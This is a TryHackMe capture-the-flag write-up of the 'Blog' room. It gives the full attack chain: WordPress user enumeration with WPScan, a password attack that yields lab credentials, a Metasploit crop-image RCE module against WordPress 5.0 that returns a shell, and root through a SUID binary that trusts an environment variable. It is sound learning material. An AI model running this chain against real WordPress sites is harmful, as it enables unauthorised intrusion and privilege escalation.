# Blog---TryHackMe---Cybersecurity-Learning-Journey
Completed the Blog room on TryHackMe! 🎉

# Blog - TryHackMe Writeup

## Overview

This repository documents my walkthrough of the **Blog** room on **TryHackMe**.

The room focuses on WordPress enumeration, password attacks, exploiting a vulnerable WordPress version for Remote Code Execution (RCE), and privilege escalation using a custom SUID binary.

---

# Room Information

| Item       | Details                                       |
| ---------- | --------------------------------------------- |
| Platform   | TryHackMe                                     |
| Room       | Blog                                          |
| Category   | Web Exploitation / Linux Privilege Escalation |
| Difficulty | Medium                                        |

---

# Skills Learned

* Web Enumeration
* WordPress Enumeration
* WPScan
* Password Attacks
* WordPress Authentication
* Remote Code Execution (RCE)
* Metasploit Framework
* Linux Enumeration
* SUID Enumeration
* Binary Analysis
* Environment Variable Exploitation
* Linux Privilege Escalation

---

# Enumeration

## Nmap Scan

The first step was identifying the services running on the target.

```bash
nmap -sC -sV <TARGET_IP>
```

The scan revealed:

* HTTP (WordPress)
* SMB

---

## Website Enumeration

Browsing the website revealed a WordPress blog.

The blog contained a post written by:

* Karen Wheeler

which referenced:

* Billy Joel

---

## WordPress User Enumeration

Using WPScan:

```bash
wpscan --url http://blog.thm -e u
```

Discovered users:

* bjoel
* kwheel

---

## Password Attack

A password attack against the discovered users revealed valid credentials:

| Username | Password  |
| -------- | --------- |
| kwheel   | cutiepie1 |

---

# Initial Access

Using the recovered credentials, authentication to WordPress was successful.

The target was running:

**WordPress 5.0**

This version is vulnerable to the Crop Image Remote Code Execution vulnerability.

---

# Exploitation

Metasploit module used:

```
exploit/multi/http/wp_crop_rce
```

Configuration:

* RHOSTS
* LHOST
* Username: kwheel
* Password: cutiepie1

Successful exploitation returned a Meterpreter session.

```
meterpreter > shell
```

Current user:

```
www-data
```

---

# User Enumeration

Searching for the user flag:

```bash
find / -name user.txt 2>/dev/null
```

Initially located:

```
/home/bjoel/user.txt
```

However, reading the file returned:

```
You won't find what you're looking for here.

TRY HARDER
```

This was a decoy.

Further enumeration discovered another user flag:

```
/media/usb/user.txt
```

Reading the file:

```bash
cat /media/usb/user.txt
```

returned the real user flag.

---

# Privilege Escalation

Searching for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

A custom binary stood out:

```
/usr/sbin/checker
```

Executing it normally returned:

```
Not an Admin
```

Analysis of the binary shows it checks for an environment variable named:

```
admin
```

Setting the variable:

```bash
export admin=1
```

Then executing the binary:

```bash
/ usr/sbin/checker
```

spawned a root shell.

Verify:

```bash
whoami
```

Output:

```
root
```

---

# Flags

## User Flag

Location:

```
/media/usb/user.txt
```

```
c8421899aae571f7af486492b7******
```

---

## Root Flag

Location:

```
/root/root.txt
```

```
9a0b2b618bef9bfa7ac28c1353******
```

---

# Credentials Discovered

| Username | Password  |
| -------- | --------- |
| kwheel   | cutiepie1 |

WordPress Users:

* kwheel
* bjoel

---

# Tools Used

* Nmap
* WPScan
* SMBClient
* Metasploit Framework
* Meterpreter
* Linux Shell
* find
* cat

---

# MITRE ATT&CK Techniques

* T1595 – Active Scanning
* T1083 – File and Directory Discovery
* T1078 – Valid Accounts
* T1190 – Exploit Public-Facing Application
* T1548 – Abuse Elevation Control Mechanism
* T1611 – Escape to Privileged Execution

---

# Conclusion

This room demonstrates a complete web exploitation chain, beginning with WordPress enumeration and credential discovery, followed by exploitation of a vulnerable WordPress installation using a public Metasploit module. After gaining access as **www-data**, Linux privilege escalation was achieved through a vulnerable custom SUID binary that trusted an attacker-controlled environment variable.

The room provides excellent practice in web application assessment, post-exploitation enumeration, and Linux privilege escalation techniques.

---

LinkedIn: []

X: []

---

#TryHackMe #CyberSecurity #WordPress #Metasploit #PrivilegeEscalation #Linux #WebSecurity #WPScan #CTF #EthicalHacking #InfoSec

